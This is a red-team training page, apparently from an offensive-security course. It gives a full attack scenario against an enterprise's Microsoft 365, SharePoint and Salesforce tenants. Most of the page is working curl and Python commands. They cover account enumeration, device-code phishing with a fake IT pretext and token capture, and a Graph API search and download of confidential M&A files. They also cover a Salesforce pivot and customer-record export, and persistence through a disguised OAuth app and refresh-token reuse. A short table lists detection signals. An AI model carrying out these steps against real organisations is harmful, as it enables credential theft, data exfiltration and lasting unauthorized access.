---
layout: training-page
title: "SaaS Application Red Team — Full Attack Scenario"
module: "Scenarios"
tags:
  - saas
  - scenario
  - oauth
  - api
  - tenant-isolation
  - m365
  - salesforce
  - full-scenario
page_key: "scenarios-saas-red-team"
render_with_liquid: false
---

# SaaS Application Red Team — Full Attack Scenario

End-to-end red team scenario targeting a mid-size enterprise's SaaS stack. The scenario covers initial access through a SaaS phishing vector, tenant enumeration, cross-tenant privilege escalation, and data exfiltration — with detection notes at each stage.

**Scenario premise:** An organization uses Microsoft 365 (email, Teams, SharePoint), Salesforce (CRM), and a GitHub Enterprise instance. The red team objective is to reach Salesforce customer records and SharePoint document libraries containing M&A data.

---

## Phase 1: Reconnaissance

### SaaS Tenant Discovery

```
# Discover Microsoft tenant from email domain:
curl -s "https://login.microsoftonline.com/contoso.com/.well-known/openid-configuration" | jq '.issuer'
# → https://sts.windows.net/{tenant-id}/

# Get tenant name and federation info:
curl -s "https://login.microsoftonline.com/GetUserRealm.srf?login=user@contoso.com&xml=1"
# Shows: IsFederatedUser, AuthURL (ADFS endpoint if federated)

# Enumerate M365 services (DNS records reveal SaaS footprint):
for rec in autodiscover._tcp enterpriseregistration enterpriseenrollment lyncdiscover sip; do
  dig +short ${rec}.contoso.com 2>/dev/null
done

# Microsoft 365 tenant ID discovery:
curl -s "https://login.microsoftonline.com/contoso.com/v2.0/.well-known/openid-configuration" | \
  python3 -c "import json,sys; d=json.load(sys.stdin); print(d['token_endpoint'])"
```

### Identifying SaaS Accounts and Permissions

```
# LinkedIn OSINT — find employees and job titles
# Target: IT Admins, Salesforce Admins, SharePoint admins

# GitHub org enumeration:
gh api /orgs/contoso/members --paginate | jq '.[].login'

# Emails from GitHub commits (public repos):
git log --all --format='%ae' | sort -u | grep "@contoso.com"

# Check for exposed Salesforce connected apps (Google dork):
# site:contoso.com inurl:salesforce.com OR inurl:force.com
# site:contoso.my.salesforce.com

# M365 email enumeration (valid vs. invalid accounts):
python3 -c "
import requests
emails = ['admin@contoso.com', 'jdoe@contoso.com', 'helpdesk@contoso.com']
for email in emails:
    r = requests.get(f'https://login.microsoftonline.com/GetCredentialType.srf',
        params={'username': email, 'isOtherIdpSupported': 'true'})
    d = r.json()
    exists = d.get('IfExistsResult', -1)
    print(f'{email}: {\"EXISTS\" if exists == 0 else \"unknown\"}')"
```

---

## Phase 2: Initial Access — OAuth Device Code Phishing

Target: M365 access for an identified IT admin account.

```
# Step 1: Request device code targeting M365 scopes:
curl -s -X POST "https://login.microsoftonline.com/contoso.com/oauth2/v2.0/devicecode" \
  -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=https://graph.microsoft.com/.default openid profile"

# Parse response:
# user_code: "HNFKM9QZ"
# verification_uri: "https://microsoft.com/devicelogin"

# Step 2: Craft Teams message (from a recon-discovered account, or external):
# Pretext: "IT is deploying MDE on all admin devices — verify your device here"
# Send user_code + verification_uri via Teams chat, email, or SMS

# Step 3: Poll for token:
while true; do
  RESP=$(curl -s -X POST "https://login.microsoftonline.com/contoso.com/oauth2/v2.0/token" \
    -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=${DEVICE_CODE}&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46")
  echo "$RESP" | grep -q "access_token" && echo "$RESP" | python3 -m json.tool && break
  sleep 5
done

# Save tokens:
ACCESS_TOKEN=$(echo "$RESP" | python3 -c "import json,sys; print(json.load(sys.stdin)['access_token'])")
REFRESH_TOKEN=$(echo "$RESP" | python3 -c "import json,sys; print(json.load(sys.stdin)['refresh_token'])")
```

---

## Phase 3: M365 Tenant Enumeration

```
# Who am I?
curl -s "https://graph.microsoft.com/v1.0/me" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '{displayName,mail,jobTitle,id}'

# Enumerate all users (requires User.ReadBasic.All — often granted by default):
curl -s "https://graph.microsoft.com/v1.0/users?\$select=displayName,mail,jobTitle,department" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.value[] | "\(.displayName) | \(.mail) | \(.jobTitle)"'

# Find privileged users:
curl -s "https://graph.microsoft.com/v1.0/directoryRoles" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.value[] | select(.displayName | test("Admin")) | .id,.displayName'

# Get members of Global Administrator role:
ROLE_ID="62e90394-69f5-4237-9190-012177145e10"  # Global Admin role template ID
curl -s "https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=${ROLE_ID}/members" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.value[] | .displayName,.mail'

# SharePoint sites enumeration:
curl -s "https://graph.microsoft.com/v1.0/sites?search=*" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.value[] | .webUrl,.displayName'

# List SharePoint drives (document libraries):
SITE_ID="<site-id-from-above>"
curl -s "https://graph.microsoft.com/v1.0/sites/${SITE_ID}/drives" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.value[] | .name,.webUrl'
```

---

## Phase 4: SharePoint Data Access

```
# Search for sensitive files across all SharePoint:
curl -s "https://graph.microsoft.com/v1.0/search/query" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "requests": [{
      "entityTypes": ["driveItem"],
      "query": {"queryString": "M&A OR acquisition OR confidential OR \"board of directors\""},
      "fields": ["name","webUrl","lastModifiedDateTime","size"]
    }]
  }' | jq '.value[0].hitsContainers[0].hits[].resource | .name,.webUrl'

# Download file directly:
FILE_ITEM_ID="<item-id>"
curl -s "https://graph.microsoft.com/v1.0/drives/${DRIVE_ID}/items/${FILE_ITEM_ID}/content" \
  -H "Authorization: Bearer $ACCESS_TOKEN" -o exfil.docx

# Read Teams messages (intelligence gathering):
curl -s "https://graph.microsoft.com/v1.0/me/chats?\$expand=members" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.value[] | .topic'
```

---

## Phase 5: Salesforce Pivot

Salesforce is often configured with SSO via M365 (SAML or OIDC). If the compromised M365 account has Salesforce access:

```
# SAML SSO flow — check if Salesforce uses M365 as IdP:
# Access https://contoso.my.salesforce.com → redirects to MS login
# With valid MS session, SAML assertion is issued automatically

# If Salesforce has a connected app using M365 tokens:
# Look for OAuth app consent in M365:
curl -s "https://graph.microsoft.com/v1.0/me/oauth2PermissionGrants" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.value[] | .resourceId,.scope'

# Salesforce API access via OAuth:
# If client_id/client_secret found in GitHub/config files:
curl -s "https://login.salesforce.com/services/oauth2/token" \
  -d "grant_type=password&client_id=CLIENT_ID&client_secret=CLIENT_SECRET&username=admin@contoso.com&password=PASSWORD"

# Query Salesforce CRM data:
SF_TOKEN="<salesforce-access-token>"
curl -s "https://contoso.my.salesforce.com/services/data/v59.0/query/?q=SELECT+Name,Email,Phone+FROM+Contact+LIMIT+100" \
  -H "Authorization: Bearer $SF_TOKEN" | jq '.records[] | .Name,.Email'

# Export account records:
curl -s "https://contoso.my.salesforce.com/services/data/v59.0/query/?q=SELECT+Name,AnnualRevenue,Industry+FROM+Account" \
  -H "Authorization: Bearer $SF_TOKEN" | jq '.records[]'
```

---

## Phase 6: Persistence

```
# M365 persistence — register new OAuth app (requires Application.ReadWrite.All):
curl -s -X POST "https://graph.microsoft.com/v1.0/applications" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "displayName": "IT-Diagnostics-Tool",
    "requiredResourceAccess": [{
      "resourceAppId": "00000003-0000-0000-c000-000000000000",
      "resourceAccess": [{"id": "e1fe6dd8-ba31-4d61-89e7-88639da4683d","type":"Scope"}]
    }]
  }'

# Add credentials to app (for persistent token generation):
APP_ID="<new-app-object-id>"
curl -s -X POST "https://graph.microsoft.com/v1.0/applications/${APP_ID}/addPassword" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"passwordCredential": {"displayName": "diagnostic-secret"}}'

# Refresh token abuse (90-day lifetime):
curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "grant_type=refresh_token&refresh_token=${REFRESH_TOKEN}&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=https://graph.microsoft.com/.default"
```

---

## Detection Points

| Phase | Red Team Action | Detection Signal |
|-------|----------------|-----------------|
| Recon | Tenant ID enumeration | DNS query logs for autodiscover/lyncdiscover |
| Initial Access | Device code auth | Entra ID sign-in log: AuthenticationProtocol=deviceCode |
| Enum | MS Graph /users bulk query | M365 audit log: UserActivity → ListUsers volume spike |
| Enum | Directory role membership query | Entra ID: Read role members (low-signal but loggable) |
| SharePoint | Search query for "M&A" | Unified Audit Log: SearchQueryInitiatedSharePoint |
| SharePoint | File download | Unified Audit Log: FileDownloaded, FileAccessed |
| Salesforce | CRM record export | Salesforce Event Monitoring: API query volume |
| Persistence | App registration | Entra ID: Application admin audit: Add application |

---

## Tools

- **AADInternals** — tenant enumeration, device code automation, Entra ID attack toolkit
- **ROADtools** — read-only AD enumeration via MS Graph
- **GraphRunner** — automated M365 post-exploitation via Graph API
- **TokenTactics** — token manipulation for M365
- **Hawk** — M365 forensic log collection (blue team tool, useful to understand detection)

---

## Resources

- Microsoft Entra ID attack techniques — `github.com/dirkjanm/ROADtools`
- GraphRunner M365 post-exploitation — `github.com/dafthack/GraphRunner`
- TokenTactics — `github.com/rvrsh3ll/TokenTactics`
- AADInternals — `github.com/Gerenios/AADInternals`
- M365 Unified Audit Log reference — `learn.microsoft.com/en-us/purview/audit-log-activities`
- Salesforce security guide — `trailhead.salesforce.com/en/content/learn/modules/security-basics`
